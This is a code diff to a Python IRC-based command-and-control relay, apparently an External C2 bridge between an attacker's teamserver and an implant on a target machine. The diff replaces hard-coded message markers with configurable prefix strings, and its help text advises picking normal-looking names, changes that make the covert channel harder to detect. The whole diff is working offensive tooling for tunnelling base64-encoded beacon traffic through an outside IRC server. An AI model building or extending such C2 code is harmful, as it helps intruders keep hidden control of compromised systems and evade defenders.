@@ -26,17 +26,21 @@ class IRCinfo:
     """
     @brief Class to hold info for IRC session
     """
-    def __init__(self, src_ip, ip, port, nick, op_nick, op_password, user, real_name, channel, client_nick):
+    def __init__(self, src_ip, ip, port, nick, op_nick, op_password, user, real_name, channel, client_nick, traffic_str, len_str, start_str):
         """
 
         :param ip: IP address of IRC server
         :param port: Port of IRC server
-        :param nick: NICK program will connect as
-        :param password: PASS program will use
+        :param nick: NICK program will connect as in irc
+        :param op_nick: NICK program will use to auth as an operator
+        :param password: PASS program will use to auth as an operator
         :param user: USER program will connect as
-        :param real_name: REALNAME program will connect as (optional in IRC)
+        :param real_name: REALNAME program will connect as
         :param channel: CHANNEL program will auto-join
         :param client_nick: NICK program will send data to (should be NICK C2 client connected as)
+        :param traffic_str: String that will prefix the B64 encoded message.
+        :param len_str: String that will prefix the int representing the length of the incomming B64 encoded data.
+        :param start_str: String that will tell the server to start transmitting data.
         """
         self.src_ip = src_ip
         self.ip = ip
@@ -48,6 +52,9 @@ class IRCinfo:
         self.real_name = real_name
         self.channel = channel
         self.client_nick = client_nick
+        self.traffic_str = traffic_str
+        self.len_str = len_str
+        self.start_str = start_str
         
 
 class ExternalC2Controller:
@@ -149,19 +156,19 @@ class ExternalC2Controller:
             # print("length of encoded data: {}".format(len(encodedmsg)))
 
             # Send len of encodedmsg so client can malloc recv buffer
-            ircencodedlen = "PRIVMSG #{} :Len-{}\r\n".format(ircinfo.channel, len(encodedmsg))
+            ircencodedlen = "PRIVMSG #{} :{}-{}\r\n".format(ircinfo.channel, ircinfo.len_str, len(encodedmsg))
             self._socketBeacon.sendall(ircencodedlen.encode())
             
             offset = 0
             # Break up message by 425 bytes. Max IRC message size is 512 per RFC. Got errors when I tried 480 and 499.
             while offset < len(encodedmsg):
                 if offset + 425 > len(encodedmsg):
-                    ircencodedmsg = "PRIVMSG #{} :TrafficGen-{}\r\n".format(ircinfo.channel,
+                    ircencodedmsg = "PRIVMSG #{} :{}-{}\r\n".format(ircinfo.channel, ircinfo.traffic_str,
                                                                            encodedmsg[offset:].decode())
                     self._socketBeacon.sendall(ircencodedmsg.encode())
                     break
                 else:
-                    ircencodedmsg = "PRIVMSG #{} :TrafficGen-{}\r\n".format(ircinfo.channel, 
+                    ircencodedmsg = "PRIVMSG #{} :{}-{}\r\n".format(ircinfo.channel, ircinfo.traffic_str,
                                                                            encodedmsg[offset:offset+425].decode())
                     offset += 425
                     self._socketBeacon.sendall(ircencodedmsg.encode())
@@ -179,7 +186,7 @@ class ExternalC2Controller:
         message = ""
         quitting = "PRIVMSG #{} :quitting\r\n".format(ircinfo.channel)
         quitmsg = "QUIT :\r\n"
-        traffic = "PRIVMSG #{} :TrafficGen-".format(ircinfo.channel)
+        traffic = "PRIVMSG #{} :{}-".format(ircinfo.channel, ircinfo.traffic_str)
         chanexit = "PRIVMSG #{} :exit".format(ircinfo.channel)
         client_quit = "Client exiting: {}".format(ircinfo.client_nick)
         while True:
@@ -274,7 +281,7 @@ class ExternalC2Controller:
     def wait_for_client(self, ircinfo):
         """
 
-        :return: True if cloak message is seen, False if Closing Link message is seen
+        :return: True if start message is seen, False if Closing Link message is seen
         """
         while True:
             data = self._socketBeacon.recv(4096).decode()
@@ -284,8 +291,8 @@ class ExternalC2Controller:
             self.ping_check(data)
 
             if data.find("PRIVMSG ") != -1:
-                cloak = "PRIVMSG #{} :cloak".format(ircinfo.channel)
-                if data.find(cloak) != -1:
+                start = "PRIVMSG #{} :{}".format(ircinfo.channel, ircinfo.start_str)
+                if data.find(start) != -1:
                     return True
 
                 quitting = "PRIVMSG #{} :quitting\r\n".format(ircinfo.channel)
@@ -358,13 +365,16 @@ parser.add_argument('src_ip', help="IP of teamserver (or redirector)")
 parser.add_argument('irc_ip', help="IP of IRC server, not teamserver. (i.e. UnrealIRCd server)")
 parser.add_argument('irc_port', type=int, help="Port number of IRC server. Typically 6667")
 parser.add_argument('nick', help="Name your server will use in IRC")
-parser.add_argument('op_nick', help="Nick of operator you will authenticate as.")
+parser.add_argument('op_nick', help="Nick of operator you will authenticate as")
 parser.add_argument('op_pass', help="Password used for authenticating as operator")
 parser.add_argument('user', help="User your server will use. Only passed to look more normal, choose any normal/expected username.")
 parser.add_argument('real_name', help="Realname your server will use. Only passed to look more normal, choose any normal/expected realname.")
 parser.add_argument('channel', help="Channel your server will connect to. Enter without #, we do that for you.")
 parser.add_argument('client_nick', help="Nick of client you will talk to. You need to set this to the NICK you pass to your client program on target")
+parser.add_argument('traffic_str', help="String that will prefix the B64 encoded message. (i.e. TrafficGen) This will be used to find the data in the string. It must be the same as the client.")
+parser.add_argument('len_str', help="String that will prefix the int representing the length of the incomming B64 encoded data. (i.e. Len) This will be used to find the lenth. It must be the same as the client.")
+parser.add_argument('start_str', help="String that will tell the server to start transmitting data. It must be the same as the client.")
 args = parser.parse_args()
 controller = ExternalC2Controller(2222)
-ircinfo = IRCinfo(args.src_ip, args.irc_ip, args.irc_port, args.nick, args.op_nick, args.op_pass, args.user, args.real_name, args.channel, args.client_nick)
+ircinfo = IRCinfo(args.src_ip, args.irc_ip, args.irc_port, args.nick, args.op_nick, args.op_pass, args.user, args.real_name, args.channel, args.client_nick, args.traffic_str, args.len_str, args.start_str)
 controller.run(ircinfo)
